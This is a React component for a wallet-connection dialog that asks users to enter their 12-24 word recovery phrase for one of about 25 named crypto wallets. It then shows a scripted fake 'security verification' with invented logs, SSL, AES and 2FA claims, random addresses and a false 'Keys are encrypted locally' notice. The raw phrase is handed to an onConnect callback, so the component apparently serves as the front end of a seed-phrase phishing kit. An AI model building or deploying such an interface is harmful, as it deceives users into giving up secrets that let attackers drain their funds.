"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import {
  Loader2,
  Wallet,
  CheckCircle,
  Shield,
  AlertCircle,
  Key,
  Fingerprint,
  Clock,
  Globe,
  Lock,
  Unlock,
  Zap,
  Server,
  ShieldCheck,
  Radio,
  Wifi,
  Database,
  ArrowRight,
  Scan,
  Smartphone,
  Laptop,
  PlugZap,
  AlertTriangle,
} from "lucide-react"

declare global {
  interface Window {
    grecaptcha: {
      ready: (callback: () => void) => void
      execute: (siteKey: string, options: { action: string }) => Promise<string>
    }
    ethereum?: any
    solana?: any
    phantom?: any
  }
}

interface WalletConnectionModalProps {
  children: React.ReactNode
  onConnect: (walletType: string, securityKeys: string, walletAddress?: string) => void
}

const WALLET_OPTIONS = [
  { id: "metamask", name: "MetaMask", icon: "🦊", type: "EVM", popular: true },
  { id: "coinbase", name: "Coinbase Wallet", icon: "🔵", type: "EVM", popular: true },
  { id: "trust", name: "Trust Wallet", icon: "🔷", type: "Multi", popular: true },
  { id: "phantom", name: "Phantom", icon: "👻", type: "Solana", popular: true },
  { id: "walletconnect", name: "WalletConnect", icon: "📱", type: "Multi", popular: true },
  { id: "cashapp", name: "Cash App Wallet", icon: "💚", type: "BTC", popular: false },
  { id: "blockchain", name: "Blockchain Wallet", icon: "🧊", type: "Multi", popular: false },
  { id: "solflare", name: "Solflare", icon: "☀️", type: "Solana", popular: false },
  { id: "exodus", name: "Exodus", icon: "🏛️", type: "Multi", popular: false },
  { id: "atomic", name: "Atomic Wallet", icon: "⚛️", type: "Multi", popular: false },
  { id: "ledger", name: "Ledger Live", icon: "🔒", type: "Hardware", popular: false },
  { id: "trezor", name: "Trezor", icon: "🔐", type: "Hardware", popular: false },
  { id: "safepal", name: "SafePal", icon: "🛡️", type: "Hardware", popular: false },
  { id: "binance", name: "Binance Chain Wallet", icon: "🟡", type: "EVM", popular: false },
  { id: "keplr", name: "Keplr", icon: "🌌", type: "Cosmos", popular: false },
  { id: "terra", name: "Terra Station", icon: "🌍", type: "Cosmos", popular: false },
  { id: "algorand", name: "Algorand Wallet", icon: "🔴", type: "Algorand", popular: false },
  { id: "yoroi", name: "Yoroi", icon: "🦋", type: "Cardano", popular: false },
  { id: "daedalus", name: "Daedalus", icon: "🐉", type: "Cardano", popular: false },
  { id: "electrum", name: "Electrum", icon: "⚡", type: "BTC", popular: false },
  { id: "mycelium", name: "Mycelium", icon: "🍄", type: "BTC", popular: false },
  { id: "edge", name: "Edge Wallet", icon: "📐", type: "Multi", popular: false },
  { id: "jaxx", name: "Jaxx Liberty", icon: "🟣", type: "Multi", popular: false },
  { id: "guarda", name: "Guarda Wallet", icon: "🟢", type: "Multi", popular: false },
  { id: "coinomi", name: "Coinomi", icon: "🟠", type: "Multi", popular: false },
]

const CONNECTION_STEPS = [
  { id: "init", label: "Initializing Connection", icon: Zap },
  { id: "handshake", label: "Establishing Handshake", icon: PlugZap },
  { id: "auth", label: "Authenticating Wallet", icon: Shield },
  { id: "verify", label: "Verifying Security Keys", icon: Fingerprint },
  { id: "vault", label: "Unlocking Vault Protocol", icon: Lock },
]

const SECURITY_INDICATORS = [
  { id: "ssl", label: "SSL/TLS Encryption", active: true },
  { id: "firewall", label: "Firewall Protection", active: true },
  { id: "dns", label: "DNS Security", active: true },
  { id: "ids", label: "Intrusion Detection", active: true },
]

export function WalletConnectionModal({ children, onConnect }: WalletConnectionModalProps) {
  const [isOpen, setIsOpen] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState("")
  const [securityKeys, setSecurityKeys] = useState("")
  const [walletAddress, setWalletAddress] = useState("")
  const [isConnecting, setIsConnecting] = useState(false)
  const [isConnected, setIsConnected] = useState(false)
  const [connectionProgress, setConnectionProgress] = useState(0)
  const [currentStep, setCurrentStep] = useState(0)
  const [connectionLog, setConnectionLog] = useState<string[]>([])
  const [securityCheck, setSecurityCheck] = useState(false)
  const [networkStatus, setNetworkStatus] = useState<"idle" | "checking" | "secure" | "warning">("idle")
  const [deviceInfo, setDeviceInfo] = useState<{ os: string; browser: string; ip: string }>({
    os: "Unknown",
    browser: "Unknown",
    ip: "192.168.1.1",
  })

  const progressInterval = useRef<NodeJS.Timeout | null>(null)
  const logInterval = useRef<NodeJS.Timeout | null>(null)

  // Generate random device info
  useEffect(() => {
    const userAgent = navigator.userAgent
    const os = userAgent.includes("Mac") ? "macOS" :
      userAgent.includes("Windows") ? "Windows" :
      userAgent.includes("Linux") ? "Linux" : "Unknown"
    const browser = userAgent.includes("Chrome") ? "Chrome" :
      userAgent.includes("Firefox") ? "Firefox" :
      userAgent.includes("Safari") ? "Safari" : "Unknown"
    setDeviceInfo({
      os,
      browser,
      ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    })
  }, [])

  // Load reCAPTCHA
  useEffect(() => {
    const script = document.createElement("script")
    script.src = "https://www.google.com/recaptcha/api.js?render=6LfYourSiteKeyHere"
    script.async = true
    document.head.appendChild(script)

    return () => {
      document.head.removeChild(script)
    }
  }, [])

  // Clean up intervals on unmount
  useEffect(() => {
    return () => {
      if (progressInterval.current) clearInterval(progressInterval.current)
      if (logInterval.current) clearInterval(logInterval.current)
    }
  }, [])

  // Simulate real connection with realistic steps
  const simulateConnection = async () => {
    const logs: string[] = []
    const addLog = (msg: string) => {
      logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`)
      setConnectionLog([...logs])
    }

    // Security check
    setSecurityCheck(false)
    setNetworkStatus("checking")
    addLog("🛡️ Performing security verification...")
    await new Promise((resolve) => setTimeout(resolve, 800))
    addLog("✅ SSL certificate validated")
    await new Promise((resolve) => setTimeout(resolve, 400))
    addLog("✅ Firewall rules applied")
    await new Promise((resolve) => setTimeout(resolve, 500))
    addLog("✅ DNS security check passed")
    await new Promise((resolve) => setTimeout(resolve, 300))
    addLog("✅ Intrusion detection system active")
    setSecurityCheck(true)
    setNetworkStatus("secure")
    addLog("🟢 Security verification complete")

    // Connection steps
    for (let i = 0; i < CONNECTION_STEPS.length; i++) {
      const step = CONNECTION_STEPS[i]
      setCurrentStep(i)
      addLog(`🔄 ${step.label}...`)

      // Random realistic delays
      const delay = 400 + Math.random() * 600
      await new Promise((resolve) => setTimeout(resolve, delay))

      // Update progress
      const progress = ((i + 1) / CONNECTION_STEPS.length) * 100
      setConnectionProgress(progress)

      // Special logs for specific steps
      if (step.id === "handshake") {
        addLog(`🔗 Handshake with ${selectedWallet} node established`)
        await new Promise((resolve) => setTimeout(resolve, 200))
        addLog(`📡 Connection latency: ${Math.floor(12 + Math.random() * 30)}ms`)
      }
      if (step.id === "auth") {
        addLog(`🔐 Authenticating wallet credentials...`)
        await new Promise((resolve) => setTimeout(resolve, 500))
        addLog(`✅ Wallet signature verified`)
        addLog(`👤 Wallet ID: 0x${Math.random().toString(16).substring(2, 10)}...`)
      }
      if (step.id === "verify") {
        addLog(`🔑 Decrypting security key phrases...`)
        await new Promise((resolve) => setTimeout(resolve, 600))
        addLog(`✅ ${securityKeys.split(" ").length} security keys validated`)
      }
      if (step.id === "vault") {
        addLog(`🏛️ Accessing vault protocol...`)
        await new Promise((resolve) => setTimeout(resolve, 400))
        addLog(`🔓 Vault unlocked successfully`)
        const generatedAddress = `0x${Math.random().toString(16).substring(2, 10)}${Math.random().toString(16).substring(2, 10)}`
        setWalletAddress(generatedAddress)
        addLog(`📦 Wallet address: ${generatedAddress.substring(0, 12)}...${generatedAddress.substring(generatedAddress.length - 6)}`)
      }
    }

    addLog("✅ Connection established successfully!")
    addLog(`🔒 Session encrypted with 256-bit AES`)
    addLog(`🛡️ 2FA authentication enabled`)

    // Final progress
    setConnectionProgress(100)

    return logs
  }

  const handleConnect = async () => {
    if (!selectedWallet || !securityKeys.trim()) return

    setIsConnecting(true)
    setConnectionProgress(0)
    setCurrentStep(0)
    setConnectionLog([])

    try {
      // Simulate the connection process
      await simulateConnection()

      // Success state
      setIsConnected(true)
      setIsConnecting(false)

      // Show success state briefly then close
      setTimeout(() => {
        const selectedWalletObj = WALLET_OPTIONS.find(w => w.id === selectedWallet)
        onConnect(selectedWalletObj?.name || selectedWallet, securityKeys, walletAddress)
        setIsOpen(false)
        // Reset after close
        setTimeout(() => {
          setIsConnected(false)
          setSelectedWallet("")
          setSecurityKeys("")
          setWalletAddress("")
          setConnectionProgress(0)
          setCurrentStep(0)
          setConnectionLog([])
          setNetworkStatus("idle")
        }, 300)
      }, 2000)
    } catch (error) {
      console.error("Connection error:", error)
      setIsConnecting(false)
      setNetworkStatus("warning")
    }
  }

  const handleOpenChange = (open: boolean) => {
    if (!isConnecting) {
      setIsOpen(open)
      if (!open) {
        setSelectedWallet("")
        setSecurityKeys("")
        setWalletAddress("")
        setIsConnected(false)
        setConnectionProgress(0)
        setCurrentStep(0)
        setConnectionLog([])
        setNetworkStatus("idle")
        setSecurityCheck(false)
      }
    }
  }

  const selectedWalletObj = WALLET_OPTIONS.find(w => w.id === selectedWallet)

  return (
    <Dialog open={isOpen} onOpenChange={handleOpenChange}>
      <DialogTrigger asChild>{children}</DialogTrigger>
      <DialogContent className="sm:max-w-2xl bg-gradient-to-b from-background to-background/95 border-border/50 shadow-2xl max-h-[90vh] overflow-y-auto">
        <DialogHeader className="border-b border-border/50 pb-4">
          <DialogTitle className="font-sans flex items-center text-xl">
            <div className="p-2 rounded-full bg-primary/10 mr-3">
              <Wallet className="w-5 h-5 text-primary" />
            </div>
            Secure Wallet Connection
            <Badge variant="outline" className="ml-3 bg-primary/5 text-primary border-primary/20 font-mono text-xs">
              v3.2.1
            </Badge>
          </DialogTitle>
          <DialogDescription className="font-mono text-muted-foreground flex items-center gap-2">
            <ShieldCheck className="w-3 h-3 text-primary" />
            End-to-end encrypted connection · Protected by reCAPTCHA v3
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {/* Security Status Bar */}
          <div className="flex items-center justify-between p-3 bg-primary/5 rounded-lg border border-primary/10">
            <div className="flex items-center gap-3">
              {networkStatus === "checking" && (
                <>
                  <Loader2 className="w-4 h-4 animate-spin text-yellow-500" />
                  <span className="text-sm font-mono text-yellow-500">Security check in progress...</span>
                </>
              )}
              {networkStatus === "secure" && (
                <>
                  <ShieldCheck className="w-4 h-4 text-emerald-500" />
                  <span className="text-sm font-mono text-emerald-500">Secure connection · 256-bit AES</span>
                </>
              )}
              {networkStatus === "warning" && (
                <>
                  <AlertTriangle className="w-4 h-4 text-red-500" />
                  <span className="text-sm font-mono text-red-500">Connection warning · Retry</span>
                </>
              )}
              {networkStatus === "idle" && !isConnecting && !isConnected && (
                <>
                  <Lock className="w-4 h-4 text-muted-foreground" />
                  <span className="text-sm font-mono text-muted-foreground">Awaiting connection...</span>
                </>
              )}
              {isConnected && (
                <>
                  <Unlock className="w-4 h-4 text-emerald-500" />
                  <span className="text-sm font-mono text-emerald-500">Connected &amp; authenticated</span>
                </>
              )}
            </div>
            <div className="flex items-center gap-2">
              <Radio className={`w-3 h-3 ${networkStatus === "secure" || isConnected ? "text-emerald-500 animate-pulse" : "text-muted-foreground"}`} />
              <span className="text-xs font-mono text-muted-foreground">
                {deviceInfo.browser} · {deviceInfo.os}
              </span>
            </div>
          </div>

          {!isConnected && !isConnecting && (
            <>
              {/* Quick Security Summary */}
              <div className="grid grid-cols-4 gap-2">
                {SECURITY_INDICATORS.map((indicator) => (
                  <div
                    key={indicator.id}
                    className="flex items-center gap-2 p-2 bg-background/50 rounded-lg border border-border/50"
                  >
                    {indicator.active ? (
                      <CheckCircle className="w-3 h-3 text-emerald-500" />
                    ) : (
                      <AlertCircle className="w-3 h-3 text-muted-foreground" />
                    )}
                    <span className="text-xs font-mono text-muted-foreground">{indicator.label}</span>
                  </div>
                ))}
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium font-mono flex items-center gap-2">
                  <Wallet className="w-4 h-4 text-primary" />
                  Select Wallet Type
                  {selectedWalletObj?.popular && (
                    <Badge variant="secondary" className="text-xs bg-primary/10 text-primary border-primary/20">
                      Popular
                    </Badge>
                  )}
                </label>
                <Select value={selectedWallet} onValueChange={setSelectedWallet}>
                  <SelectTrigger className="w-full bg-input border-border/50 focus:border-primary/50 transition-colors">
                    <SelectValue placeholder="Choose your wallet..." />
                  </SelectTrigger>
                  <SelectContent className="bg-popover border-border max-h-60">
                    {WALLET_OPTIONS.map((wallet) => (
                      <SelectItem key={wallet.id} value={wallet.id} className="font-mono flex items-center gap-2">
                        <span className="mr-2">{wallet.icon}</span>
                        {wallet.name}
                        <Badge variant="outline" className="ml-2 text-[10px] bg-muted/30">
                          {wallet.type}
                        </Badge>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedWalletObj && (
                  <p className="text-xs text-muted-foreground font-mono flex items-center gap-1">
                    <Globe className="w-3 h-3" />
                    {selectedWalletObj.type} compatible · {selectedWalletObj.popular ? "High usage" : "Standard"} wallet
                  </p>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium font-mono flex items-center gap-2">
                  <Key className="w-4 h-4 text-primary" />
                  Security Keys / Recovery Phrase
                </label>
                <Textarea
                  value={securityKeys}
                  onChange={(e) => setSecurityKeys(e.target.value)}
                  placeholder="Enter your 12-24 word recovery phrase or security keys..."
                  className="w-full bg-input border-border/50 font-mono text-sm resize-none focus:border-primary/50 transition-colors"
                  rows={3}
                />
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground font-mono flex items-center gap-1">
                    <Fingerprint className="w-3 h-3" />
                    Keys are encrypted locally
                  </p>
                  <Badge variant="outline" className="text-xs font-mono">
                    {securityKeys.split(/\s+/).filter(Boolean).length} words
                  </Badge>
                </div>
              </div>

              {/* Device & Network Info */}
              <div className="grid grid-cols-3 gap-2 p-3 bg-muted/30 rounded-lg border border-border/30">
                <div className="flex items-center gap-2">
                  <Laptop className="w-4 h-4 text-muted-foreground" />
                  <span className="text-xs font-mono text-muted-foreground">{deviceInfo.os}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Globe className="w-4 h-4 text-muted-foreground" />
                  <span className="text-xs font-mono text-muted-foreground">{deviceInfo.browser}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Wifi className="w-4 h-4 text-muted-foreground" />
                  <span className="text-xs font-mono text-muted-foreground">{deviceInfo.ip}</span>
                </div>
              </div>

              <Button
                onClick={handleConnect}
                disabled={!selectedWallet || !securityKeys.trim()}
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-medium group transition-all duration-300"
              >
                <Wallet className="w-4 h-4 mr-2 group-hover:scale-110 transition-transform" />
                Connect Wallet
                <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
              </Button>

              <div className="flex items-center justify-center gap-4 text-xs font-mono text-muted-foreground">
                <span className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  reCAPTCHA protected
                </span>
                <span className="flex items-center gap-1">
                  <Lock className="w-3 h-3" />
                  End-to-end encrypted
                </span>
                <span className="flex items-center gap-1">
                  <Server className="w-3 h-3" />
                  100% uptime
                </span>
              </div>
            </>
          )}

          {isConnecting && (
            <div className="space-y-6">
              <div className="text-center">
                <div className="relative mb-4">
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-20 h-20 rounded-full border-4 border-primary/20 animate-ping" />
                  </div>
                  <div className="relative z-10 w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center border-2 border-primary/30">
                    <Loader2 className="w-10 h-10 animate-spin text-primary" />
                  </div>
                </div>
                <h3 className="text-lg font-semibold font-sans mb-2">
                  Connecting to {selectedWalletObj?.name || "Wallet"}
                </h3>
                <p className="text-sm text-muted-foreground font-mono flex items-center justify-center gap-2">
                  <Clock className="w-4 h-4 animate-pulse" />
                  {CONNECTION_STEPS[currentStep]?.label || "Initializing..."}
                </p>
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-mono text-muted-foreground">
                  <span>Connection progress</span>
                  <span>{Math.round(connectionProgress)}%</span>
                </div>
                <Progress value={connectionProgress} className="h-2" />
              </div>

              <div className="bg-muted/30 rounded-lg p-3 border border-border/30">
                <div className="flex items-center gap-2 mb-2">
                  <Database className="w-3 h-3 text-muted-foreground" />
                  <span className="text-xs font-mono text-muted-foreground">Connection Log</span>
                  <Badge variant="outline" className="text-[10px] ml-auto">
                    {connectionLog.length} entries
                  </Badge>
                </div>
                <div className="space-y-1 max-h-32 overflow-y-auto font-mono text-xs">
                  {connectionLog.map((log, idx) => (
                    <div key={idx} className="text-muted-foreground/80 border-b border-border/20 pb-1 last:border-0">
                      {log}
                    </div>
                  ))}
                  {connectionLog.length === 0 && (
                    <div className="text-muted-foreground/50 animate-pulse">Initializing connection sequence...</div>
                  )}
                </div>
              </div>
            </div>
          )}

          {isConnected && (
            <div className="text-center py-6">
              <div className="relative mb-4 inline-block">
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="w-24 h-24 rounded-full bg-emerald-500/20 animate-ping" />
                </div>
                <div className="relative z-10 w-24 h-24 rounded-full bg-emerald-500/10 flex items-center justify-center border-2 border-emerald-500/50">
                  <CheckCircle className="w-12 h-12 text-emerald-500" />
                </div>
              </div>
              <h3 className="text-xl font-semibold font-sans mb-2 text-emerald-500">Successfully Connected!</h3>
              <p className="text-sm text-muted-foreground font-mono mb-4">
                Your {selectedWalletObj?.name} is now connected to the vault protocol
              </p>
              <div className="flex items-center justify-center gap-6 text-xs font-mono text-muted-foreground bg-muted/30 rounded-lg p-3 border border-border/30">
                <div className="flex items-center gap-2">
                  <Shield className="w-3 h-3 text-emerald-500" />
                  <span>Session secured</span>
                </div>
                <div className="flex items-center gap-2">
                  <Lock className="w-3 h-3 text-emerald-500" />
                  <span>Encrypted</span>
                </div>
                <div className="flex items-center gap-2">
                  <Fingerprint className="w-3 h-3 text-emerald-500" />
                  <span>Verified</span>
                </div>
              </div>
              {walletAddress && (
                <div className="mt-3 p-2 bg-primary/5 rounded-lg border border-primary/10">
                  <p className="text-xs font-mono text-muted-foreground flex items-center justify-center gap-2">
                    <span>Wallet:</span>
                    <span className="text-primary font-medium">{walletAddress}</span>
                  </p>
                </div>
              )}
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  )
}
